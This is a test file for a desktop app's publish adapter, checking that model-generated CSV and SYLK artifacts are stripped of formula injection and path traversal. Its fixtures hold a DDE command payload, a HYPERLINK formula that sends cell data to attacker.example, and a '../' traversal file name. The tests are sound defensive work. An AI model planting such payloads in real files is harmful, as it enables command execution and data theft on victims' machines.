import { beforeEach, describe, expect, it, vi } from 'vitest';

const { writeTextFile, mkdir } = vi.hoisted(() => ({
  writeTextFile: vi.fn(async () => undefined),
  mkdir: vi.fn(async () => undefined),
}));

vi.mock('@tauri-apps/api/path', () => ({
  appDataDir: async () => '/data',
  join: async (...parts: string[]) => parts.join('/'),
}));

vi.mock('@tauri-apps/plugin-fs', () => ({ writeTextFile, mkdir }));

import { makeDesktopPublishCallback } from '../publishAdapter';

const DDE = "=cmd|'/c calc'!A0";
const HYPERLINK = '=HYPERLINK("http://attacker.example/steal?u="&A1)';

async function publish(overrides: {
  content: string;
  language?: string;
  type?: string;
}): Promise<{ path: string; body: string; shareUrl: string }> {
  const result = await makeDesktopPublishCallback({
    id: 'art-1',
    title: 'Q3 report',
    type: overrides.type ?? 'code',
    content: overrides.content,
    language: overrides.language,
  })();
  const call = writeTextFile.mock.calls.at(-1) as unknown as [string, string] | undefined;
  expect(call).toBeDefined();
  return { path: call![0], body: call![1], shareUrl: result.shareUrl };
}

beforeEach(() => {
  writeTextFile.mockClear();
  mkdir.mockClear();
});

describe('desktop publish adapter writes no evaluable formula to disk', () => {
  it('neutralizes a code artifact whose model-chosen language names the file .csv', async () => {
    const { path, body, shareUrl } = await publish({
      content: `victim,${HYPERLINK}`,
      language: 'csv',
    });

    expect(path).toBe('/data/artifacts/Q3_report-art-1.csv');
    expect(shareUrl).toBe('file:///data/artifacts/Q3_report-art-1.csv');
    expect(body).toBe(`victim,'${HYPERLINK}`);
  });

  it('neutralizes a DDE payload published as a SYLK file', async () => {
    const { path, body } = await publish({ content: DDE, language: 'slk' });

    expect(path.endsWith('.slk')).toBe(true);
    expect(body).toBe(`'${DDE}`);
  });

  it('guards the record a lone CR starts before the file reaches disk', async () => {
    const { body } = await publish({ content: `victim,1\r${DDE}`, language: 'csv' });

    expect(body).toBe(`victim,1\r'${DDE}`);
  });

  it('guards a payload a leading number is glued to', async () => {
    const content = "victim,note\n-1,2+cmd|'/c calc'!A0";
    const { body } = await publish({ content, language: 'csv' });

    expect(body).not.toBe(content);
    expect(body).toBe("victim,note\n'-1,2+cmd|'/c calc'!A0");
  });

  it('guards a tab-delimited artifact published as .csv', async () => {
    const { body } = await publish({ content: `victim\t${HYPERLINK}`, language: 'csv' });

    expect(body).toBe(`victim\t'${HYPERLINK}`);
  });

  it('leaves a benign table byte-identical, ragged rows and CRLF included', async () => {
    const content = 'name,,city\r\nA,B\r\n1,2,3,4\r\n\r\n';
    expect((await publish({ content, language: 'csv' })).body).toBe(content);
  });

  it('leaves a real code artifact untouched', async () => {
    const content = 'const total = -1 + 2;\n';
    const { path, body } = await publish({ content, language: 'ts' });

    expect(path.endsWith('.ts')).toBe(true);
    expect(body).toBe(content);
  });

  it('cannot be handed a second extension that lands a .csv past the guard', async () => {
    const { path } = await publish({ content: DDE, language: 'data.csv' });

    expect(path.endsWith('.csv')).toBe(false);
  });

  it('keeps a model-chosen language from escaping the artifacts directory', async () => {
    const { path } = await publish({ content: DDE, language: '../../../../tmp/evil.csv' });

    expect(path.startsWith('/data/artifacts/')).toBe(true);
    expect(path).not.toContain('..');
  });
});
